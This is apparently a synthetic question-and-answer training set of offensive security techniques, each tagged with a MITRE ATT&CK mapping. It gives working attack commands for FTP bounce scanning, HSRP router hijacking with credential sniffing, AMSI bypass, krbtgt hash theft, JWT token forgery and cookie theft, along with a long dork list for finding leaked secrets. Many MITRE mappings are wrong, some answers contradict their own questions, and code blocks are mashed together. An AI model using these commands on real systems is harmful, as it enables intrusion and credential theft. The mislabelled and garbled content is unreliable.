```nmap -b <name>:<pass>@<ftp_server> <victim>nmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1 #Scan ports 21,80 of the FTPnmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24 #Scan the internal network (of the FTP) ports 21,22,445,80,443``` MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: What are the requirements to perform an FTP Bounce attack?
A: The requirements to perform an FTP Bounce attack are:

1. FTP valid credentials in the FTP Middle server
2. FTP valid credentials in Victim FTP server
3. Both server accepts the PORT command (bounce FTP attack)
4. You can write inside some directory of the FRP Middle server
5. The middle server will have more access inside the Victim FTP Server than you for some reason (this is what you are going to exploit) MITRE References: MITRE ID is T1583.004, MITRE Name is: Acquire Infrastructure: Server, and MITRE Tactics are: Resource Development.

## Q: What are the steps to perform an FTP Bounce attack?
A: The steps to perform an FTP Bounce attack are:

1. Connect to your own FTP server and make the connection passive (pasv command) to make it listen in a directory where the victim service will send the file
2. Make the file that is going to send the FTP Middle server t the Victim server (the exploit). This file will be a plaint text of the needed commands to authenticate against the Victim server, change the directory and download a file to your own server.
3. Connect to the FTP Middle Server and upload de previous file
4. Make the FTP Middle server establish a connection with the victim server and send the exploit file
5. Capture the file in your own FTP server
6. Delete the exploit file from the FTP Middle server MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Movement, and MITRE Tactics are: Lateral Movement.

## Q: How can I manually create fake 125kHz RFID cards using the Flipper Zero device?
A: You can create **fake cards in Flipper Zero** by manually indicating the data you want, and then **emulate** that card. Some RFID cards may have the ID or part of the ID printed on the physical card, which can be used to recreate the card data. MITRE References: MITRE ID is T1091, MITRE Name is: Hardware Additions, and MITRE Tactics are: Initial Access, Persistence, Privilege Escalation.

## Q: How can Flipper Zero be used to brute-force a garage door remote control?
A: If you know the protocol used for example by the garage door it's possible to **generate all the codes and send them with the Flipper Zero.** This is an example that support general common types of garages: [**https://github.com/tobiabocchi/flipperzero-bruteforce**](https://github.com/tobiabocchi/flipperzero-bruteforce) MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What are some platforms that have already searched for leaks?
A: Some platforms that have already searched for leaks are:
- https://trufflesecurity.com/blog/introducing-forager/ MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: What are some tools that can be used to search for API keys and other sensitive information leaked on GitHub?
A: Some tools that can be used to search for API keys and other sensitive information leaked on GitHub include:
- https://github.com/dxa4481/truffleHog
- https://github.com/gitleaks/gitleaks
- https://github.com/Yelp/detect-secrets
- https://github.com/hisxo/gitGraber
- https://github.com/eth0izzle/shhgit
- https://github.com/techgaun/github-dorks
- https://github.com/michenriksen/gitrob
- https://github.com/anshumanbh/git-all-secrets
- https://github.com/awslabs/git-secrets
- https://github.com/kootenpv/gittyleaks
- https://github.com/obheda12/GitDorker MITRE References: MITRE ID is T1583.004, MITRE Name is: Acquire Infrastructure: Code Repositories, and MITRE Tactics are: Resource Development.

## Q: What are some useful GitHub dorks that can be used to search for sensitive information?
A: Some useful GitHub dorks that can be used to search for sensitive information include:
```".mlab.com password""access_key""access_token""amazonaws""api.googlemaps AIza""api_key""api_secret""apidocs""apikey""apiSecret""app_key""app_secret""appkey""appkeysecret""application_key""appsecret""appspot""auth""auth_token""authorizationToken""aws_access""aws_access_key_id""aws_key""aws_secret""aws_token""AWSSecretKey""bashrc password""bucket_password""client_secret""cloudfront""codecov_token""config""conn.login""connectionstring""consumer_key""credentials""database_password""db_password""db_username""dbpasswd""dbpassword""dbuser""dot-files""dotfiles""encryption_key""fabricApiSecret""fb_secret""firebase""ftp""gh_token""github_key""github_token""gitlab""gmail_password""gmail_username""herokuapp""internal""irc_pass""JEKYLL_GITHUB_TOKEN""key""keyPassword""ldap_password""ldap_username""login""mailchimp""mailgun""master_key""mydotfiles""mysql""node_env""npmrc _auth""oauth_token""pass""passwd""password""passwords""pem private""preprod""private_key""prod""pwd""pwds""rds.amazonaws.com password""redis_password""root_password""secret""secret.password""secret_access_key""secret_key""secret_token""secrets""secure""security_credentials""send.keys""send_keys""sendkeys""SF_USERNAME salesforce""sf_username""site.com" FIREBASE_API_JSON="site.com" vim_settings.xml"slack_api""slack_token""sql_password""ssh""ssh2_auth_password""sshpass""staging""stg""storePassword""stripe""swagger""testuser""token""x-api-key""xoxb ""xoxp"[WFClient] Password= extension:icaaccess_keybucket_passworddbpassworddbuserextension:avastlic "support.avast.com"extension:batextension:cfgextension:envextension:exsextension:iniextension:json api.forecast.ioextension:json googleusercontent client_secretextension:json mongolab.comextension:pemextension:pem privateextension:ppkextension:ppk privateextension:propertiesextension:shextension:slsextension:sqlextension:sql mysql dumpextension:sql mysql dump passwordextension:yaml mongolab.comextension:zshfilename:.bash_historyfilename:.bash_history DOMAIN-NAMEfilename:.bash_profile awsfilename:.bashrc mailchimpfilename:.bashrc passwordfilename:.cshrcfilename:.dockercfg authfilename:.env DB_USERNAME NOT homesteadfilename:.env MAIL_HOST=smtp.gmail.comfilename:.esmtprc passwordfilename:.ftpconfigfilename:.git-credentialsfilename:.historyfilename:.htpasswdfilename:.netrc passwordfilename:.npmrc _authfilename:.pgpassfilename:.remote-sync.jsonfilename:.s3cfgfilename:.sh_historyfilename:.tugboat NOT _tugboatfilename:_netrc passwordfilename:apikeyfilename:bashfilename:bash_historyfilename:bash_profilefilename:bashrcfilename:beanstalkd.ymlfilename:CCCam.cfgfilename:composer.jsonfilename:configfilename:config irc_passfilename:config.json authsfilename:config.php dbpasswdfilename:configuration.php JConfig passwordfilename:connectionsfilename:connections.xmlfilename:constantsfilename:credentialsfilename:credentials aws_access_key_idfilename:cshrcfilename:databasefilename:dbeaver-data-sources.xmlfilename:deployment-config.jsonfilename:dhcpd.conffilename:dockercfgfilename:environmentfilename:express.conffilename:express.conf path:.openshiftfilename:filezilla.xmlfilename:filezilla.xml Passfilename:git-credentialsfilename:gitconfigfilename:globalfilename:historyfilename:htpasswdfilename:hub oauth_tokenfilename:id_dsafilename:id_rsafilename:id_rsa or filename:id_dsafilename:idea14.keyfilename:known_hostsfilename:logins.jsonfilename:makefilefilename:master.key path:configfilename:netrcfilename:npmrcfilename:passfilename:passwd path:etcfilename:pgpassfilename:prod.exsfilename:prod.exs NOT prod.secret.exsfilename:prod.secret.exsfilename:proftpdpasswdfilename:recentservers.xmlfilename:recentservers.xml Passfilename:robomongo.jsonfilename:s3cfgfilename:secrets.yml passwordfilename:server.cfgfilename:server.cfg rcon passwordfilename:settingsfilename:settings.py SECRET_KEYfilename:sftp-config.jsonfilename:sftp-config.json passwordfilename:sftp.json path:.vscodefilename:shadowfilename:shadow path:etcfilename:specfilename:sshd_configfilename:tokenfilename:tugboatfilename:ventrilo_srv.inifilename:WebServers.xmlfilename:wp-configfilename:wp-config.phpfilename:zhrcHEROKU_API_KEY language:jsonHEROKU_API_KEY language:shellHOMEBREW_GITHUB_API_TOKEN language:shelljsforce extension:js conn.loginlanguage:yaml -filename:travismsg nickserv identify filename:configorg:Target "AWS_ACCESS_KEY_ID"org:Target "list_aws_accounts"org:Target "aws_access_key"org:Target "aws_secret_key"org:Target "bucket_name"org:Target "S3_ACCESS_KEY_ID"org:Target "S3_BUCKET"org:Target "S3_ENDPOINT"org:Target "S3_SECRET_ACCESS_KEY"passwordpath:sites databases passwordprivate -language:javaPT_TOKEN language:bashredis_passwordroot_passwordsecret_access_keySECRET_KEY_BASE=shodan_api_key language:pythonWORDPRESS_DB_PASSWORD=xoxp OR xoxb OR xoxas3.yml.exsbeanstalkd.ymldeploy.rake.slsAWS_SECRET_ACCESS_KEYAPI KEYAPI SECRETAPI TOKENROOT PASSWORDADMIN PASSWORDGCP SECRETAWS SECRET"private" extension:pgp``` MITRE References: MITRE ID is T1597, MITRE Name is: Search Open Technical Databases, and MITRE Tactics are: Information Gathering.

## Q: How can you execute a GLBP attack using Loki?
A: To execute a GLBP attack using Loki:1. Switch to promiscuous mode and enable IP forwarding:```sudo ip link set eth0 promisc onsudo sysctl -w net.ipv4.ip_forward=1```2. Identify the target router and retrieve its IP.3. Generate a Gratuitous ARP.4. Inject a malicious GLBP packet, impersonating the AVG.5. Assign a secondary IP address to the attacker's network interface, mirroring the GLBP virtual IP.6. Implement SNAT for complete traffic visibility.7. Adjust routing to ensure continued internet access through the original AVG router. MITRE References: MITRE ID is T1556.003, MITRE Name is: Modify Authentication Process: SSH Authorized Keys, and MITRE Tactics are: Defense Evasion, Persistence.

## Q: How can you bypass HSRP authentication?
A: To bypass HSRP authentication:1. Capture the network traffic containing HSRP data using Wireshark:```tcpdump -w hsrp_traffic.pcap```2. Extract MD5 hashes from the .pcap file using hsrp2john.py:```python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes```3. Crack the MD5 hashes using John the Ripper:```john --wordlist=mywordlist.txt hsrp_hashes```4. Use the cracked HSRP password to impersonate the Active Router using Loki. MITRE References: MITRE ID is T1110.003, MITRE Name is: Brute Force: Password Spraying, and MITRE Tactics are: Credential Access.

## Q: How can you execute an HSRP injection attack using Loki?
A: To execute an HSRP injection attack using Loki:1. Launch Loki to identify HSRP advertisements.2. Set the network interface to promiscuous mode and enable IP forwarding:```sudo ip link set eth0 promisc onsudo sysctl -w net.ipv4.ip_forward=1```3. Use Loki to target the specific router, input the cracked HSRP password, and perform necessary configurations to impersonate the Active Router.4. Configure your network interface and IP tables to intercept the legitimate traffic:```sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE```5. Modify the routing table to route traffic through the former Active Router:```sudo route del defaultsudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100```6. Use net-creds.py or a similar utility to capture credentials from the intercepted traffic:```sudo python2 net-creds.py -i eth0``` MITRE References: MITRE ID is T1556.003, MITRE Name is: Modify Authentication Process: SSH Authorized Keys, and MITRE Tactics are: Defense Evasion, Persistence.

## Q: How could godoh be used to exfiltrate data during a penetration test?
A: godoh version 1.6 can be used to exfiltrate data by leveraging its `send` and `receive` commands. An attacker could start the C2 server with `godoh c2`, then use `godoh send` on the agent to transmit files to the server over the DoH C2 channel. This could allow data exfiltration while hiding the traffic within DNS queries. The `receive` command could also be used to download files from the C2 server to the agent. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can the go-donut tool be used to bypass AMSI and WLDP protections?
A: The go-donut tool can be used to bypass AMSI (Anti-Malware Scan Interface) and WLDP (Windows Lockdown Policy) protections. To do this, you can use the `-b` or `--bypass` option:```go-donut -i example.exe -o loader.bin -f 1 -a x64 -b 3```The `-b 3` option tells go-donut to continue execution even if AMSI or WLDP bypass fails. This can help bypass these security controls and execute the shellcode in-memory.MITRE ATT&CK:MITRE ID: T1055MITRE Name: Process InjectionMITRE Tactics: [Defense Evasion] MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion.

## Q: How can you acquire the NTLM hash of the krbtgt account?
A: The NTLM hash of the krbtgt account can be extracted from the Local Security Authority Subsystem Service (LSASS) process or the NT Directory Services (NTDS.dit) file located on any Domain Controller (DC) within the domain. Additionally, executing a DCsync attack is another strategy to obtain this NTLM hash, which can be performed using tools such as the lsadump::dcsync module in Mimikatz or the secretsdump.py script by Impacket. It's important to note that domain admin privileges or a similar level of access is typically required to undertake these operations. MITRE References: MITRE ID is T1003.006, MITRE Name is: NTDS from Domain Controller, and MITRE Tactics are: CredentialAccess.

## Q: How can you bypass common detections for a Golden Ticket attack?
A: The most frequent way to detect a golden ticket is by inspecting Kerberos traffic on the wire. By default, Mimikatz signs the TGT for 10 years, which will stand out as anomalous in subsequent TGS requests made with it. To bypass this detection, you can use the /startoffset, /endin and /renewmax parameters to control the start offset, duration and the maximum renewals (all in minutes). Another way to bypass detection is to look for 4769's without a prior 4768, as it's not possible to request a TGS without a TGT, and if there is no record of a TGT being issued, it can be inferred that it was forged offline. MITRE References: MITRE ID is T1558.003, MITRE Name is: Kerberoasting, and MITRE Tactics are: DefenseEvasion, PrivilegeEscalation.

## Q: How can goofile be used to find sensitive files in a target domain?
A: goofile v1.6 can be used to search for specific file types (e.g. PDFs, DOCs, etc.) on a target domain. For example, to search for PDF files on the kali.org domain, you can run the command: `goofile -d kali.org -f pdf`. This will return a list of PDF files hosted on the kali.org domain that may contain sensitive information. MITRE References: MITRE ID is T1518, MITRE Name is: Software Discovery, and MITRE Tactics are: Discovery.

## Q: How can goofile be used to find files containing sensitive keywords on a target domain?
A: goofile v1.6 allows you to search for files containing specific keywords using the `-q` or `--query` option. For example, to search the kali.org domain for PDF files containing the keyword "password", you can run: `goofile -d kali.org -f pdf -q password`. This can be useful for finding potentially sensitive information that may be exposed on a target website. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: What are some useful Google dork queries for finding sensitive information?
A: Here are some example Google dork queries that can be useful for finding sensitive information:

Find login pages on sites in Bolivia:
site:bo inurl:admin.php

Find PDF files:
filetype:pdf

Search within a specific website:
site:example.com myword

Find in the URL:
inurl:test.com

Use wildcards to find partial matches:
"I've been * for a heart"

Exclude words:
-banana bananasplit MITRE References: MITRE ID is T1593, MITRE Name is: Search Open Websites and Domains, and MITRE Tactics are: Resource Development, Intelligence Gathering.

## Q: How can Gophish be used to conduct phishing attacks?
A: Gophish version 0.12.1 is an open-source phishing toolkit that can be used to create and execute phishing campaigns. With Gophish, you can easily set up a phishing website, create email templates, and send phishing emails to target victims. This can be used for both security awareness training and penetration testing. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: What are some advanced features of Gophish that can be used for more sophisticated phishing attacks?
A: Gophish version 0.12.1 includes several advanced features that can be leveraged for more complex phishing campaigns. This includes the ability to create landing pages that mimic real websites, set up multi-stage phishing attacks, and track victim interactions and data collection. Additionally, Gophish integrates with other tools like Metasploit to deliver malware payloads as part of a phishing attack. MITRE References: MITRE ID is T1566.002, MITRE Name is: Spearphishing Link, and MITRE Tactics are: Initial Access.

## Q: How can gpp-decrypt be used in a penetration testing engagement to obtain sensitive information?
A: The gpp-decrypt tool can be used to decrypt Group Policy Preferences (GPP) encrypted strings, which may contain sensitive information such as passwords. To use gpp-decrypt, simply provide the encrypted string as an argument, and the tool will decrypt it. For example, to decrypt the string `j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw`, you can run: `gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw`, which will output the decrypted password: `Local*P4ssword!`. This can be a valuable technique during a penetration test to obtain credentials that may be stored in Group Policy Preferences. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: CredentialAccess.

## Q: How can gqrx-sdr be used to intercept and analyze wireless communications?
A: gqrx-sdr can be used to intercept and analyze wireless communications by utilizing its FFT plot and spectrum waterfall features. With the software-defined radio capabilities, users can capture and inspect wireless traffic across various frequency bands. By tuning to the appropriate frequencies, gqrx-sdr allows for passive monitoring and analysis of signals, which can be useful for security assessments and wireless pentesting. MITRE References: MITRE ID is T1053, MITRE Name is: Wireless Sniffing, and MITRE Tactics are: Collection.

## Q: How could an attacker use gr-air-modes to gather reconnaissance on aircraft in a specific area?
A: The gr-air-modes tool can be used to receive and decode Mode S transponder signals, including ADS-B reports, from aircraft in a specific area. To do this, the 'modes_rx' command can be used with the '-l' option to specify the GPS coordinates of the receiving station. This will allow the tool to display information about aircraft in the vicinity, such as their position, altitude, and flight details. The version used is 0.0.20210211-3. MITRE References: MITRE ID is T1418, MITRE Name is: Intrusion Detection System Evasion, and MITRE Tactics are: Discovery.

## Q: How could an attacker use gr-air-modes to spoof aircraft position data?
A: The gr-air-modes tool does not provide any functionality to spoof aircraft position data. It is designed as a passive receiver and decoder for Mode S transponder signals, including ADS-B reports. Spoofing aircraft position data would require more advanced tools and techniques that are outside the scope of this particular software. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: How can you extract sensitive information from the Grafana database?
A: You can extract sensitive information such as user, password, and database from the Grafana database by running the SQL query: `select user,password,database from data_source;` MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: TA0006.

## Q: How can you bypass GraphQL introspection defenses?
A: To bypass restrictions on introspection queries in APIs, inserting a **special character after the** `**__schema**` **keyword** proves effective. This method exploits common developer oversights in regex patterns that aim to block introspection by focusing on the `__schema` keyword. By adding characters like **spaces, new lines, and commas**, which GraphQL ignores but might not be accounted for in regex, restrictions can be circumvented. For instance, an introspection query with a newline after `__schema` may bypass such defenses:

Copy
```
# Example with newline to bypass
{ 
    "query": "query{__schema
    {queryType{name}}}" 
}
``` MITRE References: MITRE ID is T1590, MITRE Name is: Gather Victim Network Information, and MITRE Tactics are: Discovery.

## Q: How can you bypass authorization in GraphQL?
A: Chaining queries together can bypass a weak authentication system.

In the below example you can see that the operation is "forgotPassword" and that it should only execute the forgotPassword query associated with it. This can be bypassed by adding a query to the end, in this case we add "register" and a user variable for the system to register as a new user. MITRE References: MITRE ID is T1621, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion.

## Q: How can gss-ntlmssp be used in a penetration testing scenario to gain unauthorized access?
A: The gss-ntlmssp library can be used to perform NTLM authentication in GSSAPI-enabled applications. In a penetration testing scenario, it could be used to attempt to gain unauthorized access to systems that rely on NTLM authentication. For example, you could use gss-ntlmssp version 1.2.0 to build a tool that tries NTLM authentication against a web application or network service. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: Defense Evasion, Credential Access.

## Q: How could gss-ntlmssp be used in a CTF challenge to bypass authentication or authorization controls?
A: In a CTF challenge, gss-ntlmssp version 1.2.0 could potentially be used to attempt NTLM authentication bypasses. For example, you could write a script that uses the gss-ntlmssp library to try different NTLM authentication payloads against a web application or network service, in an attempt to gain unauthorized access. The specific use case would depend on the details of the CTF challenge, but the gss-ntlmssp library provides a way to programmatically interact with NTLM authentication mechanisms. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: Defense Evasion, Credential Access.

## Q: What are some reverse proxies that may be configured insecurely to allow unfiltered forwarding of the required headers for H2C smuggling?
A: The following services do not inherently forward both headers during proxy-pass, but may be configured insecurely, allowing unfiltered forwarding of `Upgrade` and `Connection` headers:

- AWS ALB/CLB
- NGINX
- Apache
- Squid
- Varnish
- Kong
- Envoy
- Apache Traffic Server MITRE References: MITRE ID is T1573.002, MITRE Name is: Connection Proxy: Web Service, and MITRE Tactics are: Command and Control.

## Q: What tools can be used to attempt to circumvent proxy-imposed protections and establish an H2C connection?
A: The tools [**h2csmuggler by BishopFox**](https://github.com/BishopFox/h2csmuggler) and [**h2csmuggler by assetnote**](https://github.com/assetnote/h2csmuggler) can be used to facilitate attempts to circumvent proxy-imposed protections by establishing an H2C connection. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion.

## Q: How can you get RCE on an H2 database?
A: Having access to communicate with the H2 database, you can use the exploit at https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed to get RCE on it. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you get RCE via a H2 SQL Injection vulnerability?
A: A payload is explained in this post: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ to get RCE via a H2 database by abusing a SQL Injection. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use h8mail to search for email addresses and passwords associated with a specific target?
A: To search for email addresses and passwords associated with a target using h8mail version 2.5.6, you can use the following command:

`h8mail -t target@example.com`

This will query various data breach and OSINT sources to find any compromised information related to the target email address. The `-t` or `--targets` option allows you to specify one or more email addresses or files containing email addresses to search for. The tool will then output any discovered passwords or other sensitive information associated with those accounts. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Information Gathering.

## Q: How can you use h8mail to search for email addresses on a website and find associated data breaches?
A: To search for email addresses on a website and find associated data breaches using h8mail version 2.5.6, you can use the following command:

`h8mail -u https://example.com`

This will parse the website at the provided URL, extract any email addresses found, and then query data breach databases to see if those email addresses have been involved in any known breaches. The `-u` or `--url` option allows you to specify one or more URLs or files containing URLs to scan. This can be useful for proactively identifying email addresses that may be at risk due to past data breaches. MITRE References: MITRE ID is T1593, MITRE Name is: Search Victim-Owned Websites, and MITRE Tactics are: Information Gathering.

## Q: How can you brute-force the HMAC secret?
A: See the [brute force section](/generic-methodologies-and-resources/brute-force#jwt) for information on how to brute-force the HMAC secret. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you exploit the 'jku' (JWK Set URL) header claim?
A: The instructions detail a method to assess the security of JWT tokens, particularly those employing a "jku" header claim. This claim should link to a JWKS (JSON Web Key Set) file that contains the public key necessary for the token's verification:

* Verify the "jku" claim's URL to ensure it leads to the appropriate JWKS file.
* Modify the token's "jku" value to direct towards a controlled web service, allowing traffic observation.

To simulate this scenario with `jwt_tool`, execute the following command:

```
python3 jwt_tool.py JWT_HERE -X s
``` MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0003.

## Q: How can you exploit the 'kid' (Key ID) header claim?
A: The `kid` claim is used for identifying a specific key, which becomes particularly vital in environments where multiple keys exist for token signature verification. This claim assists in selecting the appropriate key to verify a token's signature. Potential exploitation methods include:

- Revealing the key through the `kid` value by searching the web directory for the corresponding file or its variations.
- Path traversal with the `kid` value to navigate the file system and potentially execute Server-Side Request Forgery (SSRF) attacks.
- SQL injection via the `kid` value if it is used to fetch a password from a database.
- OS injection through the `kid` value if it specifies a file path used within a command execution context, leading to Remote Code Execution (RCE).

To tamper the token and change the `kid` value while retaining the original signature, you can use the `-T` flag in `jwt_tool` like this:

```
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
``` MITRE References: MITRE ID is T1528, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006.

## Q: How can you exploit the 'x5u' (X.509 URL) and 'jku' (JWK Set URL) header claims?
A: The 'x5u' (X.509 URL) and 'jku' (JWK Set URL) header claims can be exploited as follows:

- 'jku': This claim should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Try to tamper the token to point the 'jku' value to a web service you can monitor traffic for.
- 'x5u': This parameter may contain the certificate in base64. Try to change this header to a URL under your control and check if any request is received. In that case, you could tamper the JWT.

To forge a new token using a certificate controlled by you, you can create the certificate and extract the public and private keys:

```openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crtopenssl x509 -pubkey -noout -in attacker.crt > publicKey.pem```
Then you can use [jwt.io](https://jwt.io) to create the new JWT with the created public and private keys and pointing the parameter 'x5u' or 'jku' to the certificate created. MITRE References: MITRE ID is T1528, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006.

## Q: How can you exploit the 'x5c' (X.509 Certificate Chain) header claim?
A: The 'x5c' parameter may contain the certificate in base64. If the attacker generates a self-signed certificate and creates a forged token using the corresponding private key, and then replaces the 'x5c' parameter's value with the newly generated certificate and modifies the other parameters, namely 'n', 'e' and 'x5t', then the forged token would get accepted by the server.

You can generate the self-signed certificate and extract the required parameters using the following commands:

```openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crtopenssl x509 -in attacker.crt -text``` MITRE References: MITRE ID is T1528, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006.

## Q: How can you exploit the 'Embedded Public Key' vulnerability (CVE-2018-0114)?
A: If the JWT has an embedded public key, it's possible to generate a new private/public key, embed the new public key inside the token, and use it to generate a new signature. You can use the following Node.js script to generate the public key from the embedded data:

```javascriptconst NodeRSA = require('node-rsa');const fs = require('fs');n = "ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8";e = "AQAB";const key = new NodeRSA();var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');console.log(importedKey.exportKey("public"));```
Then, you can generate a new private/public key, embed the new public key inside the token, and use it to generate a new signature:

```openssl genrsa -out keypair.pem 2048openssl rsa -in keypair.pem -pubout -out publickey.crtopenssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key```
You can obtain the 'n' and 'e' values using the following Node.js script:

```javascriptconst NodeRSA = require('node-rsa');const fs = require('fs');keyPair = fs.readFileSync("keypair.pem");const key = new NodeRSA(keyPair);const publicComponents = key.exportKey('components-public');console.log('Parameter n: ', publicComponents.n.toString("hex"));console.log('Parameter e: ', publicComponents.e.toString(16));```
Finally, using the public and private key and the new 'n' and 'e' values, you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information. MITRE References: MITRE ID is T1528, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006.

## Q: How can you exploit the 'ES256: Revealing the private key with same nonce' vulnerability?
A: If some applications use ES256 and use the same nonce to generate two JWTs, the private key can be restored. Here is an example: [ECDSA: Revealing the private key, if same nonce used (with SECP256k1)](https://asecuritysite.com/encryption/ecd5) MITRE References: MITRE ID is T1528, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006.

## Q: How can the 'HttpOnly' cookie attribute be bypassed?
A: The 'HttpOnly' attribute can be bypassed in the following ways:

- If the page is sending the cookies as the response of a request (e.g., in a PHPinfo page), it's possible to abuse XSS to send a request to this page and steal the cookies from the response.
- By exploiting TRACE HTTP requests, as the response from the server will reflect the cookies sent. This technique is called Cross-Site Tracking.
- By exploiting zero/day vulnerabilities of the browsers.
- By performing a Cookie Jar overflow attack to overwrite HttpOnly cookies.
- By using a Cookie Smuggling attack to exfiltrate these cookies. MITRE References: MITRE ID is T1528, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006.

## Q: How can 'ECB' mode encryption in cookies be detected and exploited?
A: To detect and exploit ECB mode encryption in cookies:

1. Create 2 users with almost the same data (username, password, email, etc.) and try to discover some pattern inside the given cookie.
2. Create a user called, for example, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' and check if there is any pattern in the cookie (as ECB encrypts with the same key every block, the same encrypted bytes could appear if the username is encrypted).
3. There should be a pattern (with the size of a used block). So, knowing how 'a' is encrypted, you can create a username: 'a'*(size of the block)+'admin'. Then, you could delete the encrypted pattern of a block of 'a' from the cookie and have the cookie of the username 'admin'. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can 'Cookie Tossing' attacks be used to overwrite cookies across subdomains?
A: If you find an XSS vulnerability in a subdomain or control a subdomain, you can perform a 'Cookie Tossing' attack to overwrite cookies across subdomains.

This exploit takes advantage of the fact that cookies prefixed with '__Host-' are not allowed to be sent to superdomains or subdomains, but researchers found ways to trick the parser and set these cookies from subdomains. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006.

## Q: How can 'Cookie Smuggling' be used to exfiltrate HttpOnly cookies?
A: Cookie Smuggling can be used to exfiltrate HttpOnly cookies. This technique involves exploiting parsing issues in web servers to smuggle cookies, including HttpOnly cookies, out of the application. MITRE References: MITRE ID is T1528, MITRE Name is: Steal Web Session Cookie, and MITRE Tactics are: TA0006.

## Q: How can 'Session Donation' attacks be used to perform actions in the context of an attacker's account?
A: In a Session Donation attack, the attacker convinces the victim to use the attacker's session cookie. The victim, believing they are logged into their own account, will inadvertently perform actions in the context of the attacker's account. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006.

## Q: How can the HackRF device be used to perform wireless attacks and exploits?
A: The HackRF hardware can be used to perform a variety of wireless attacks and exploits. With the hackrf_transfer tool (version 2023.01.1-9), you can transmit custom signals and protocols to conduct attacks such as wireless jamming, deauthentication attacks, and rogue access point spoofing. The hackrf_sweep tool can be used to scan for and identify vulnerable wireless devices and networks. Additionally, the HackRF can be used in conjunction with software-defined radio tools and frameworks like GNU Radio to develop and deploy more sophisticated wireless attacks. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Execution, Lateral Movement.

## Q: How can the HackRF device be used to bypass wireless security controls?
A: The HackRF hardware can be used to bypass wireless security controls in several ways. With the hackrf_transfer tool (version 2023.01.1-9), you can capture wireless traffic and perform packet sniffing to collect sensitive information, such as authentication credentials or encryption keys. The hackrf_sweep tool can be used to identify and map out the wireless infrastructure, which can help identify vulnerabilities and weak points. Additionally, the HackRF can be used with software-defined radio tools to develop custom exploits and bypass authentication mechanisms on wireless networks. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing for Information, and MITRE Tactics are: Reconnaissance, Collection.

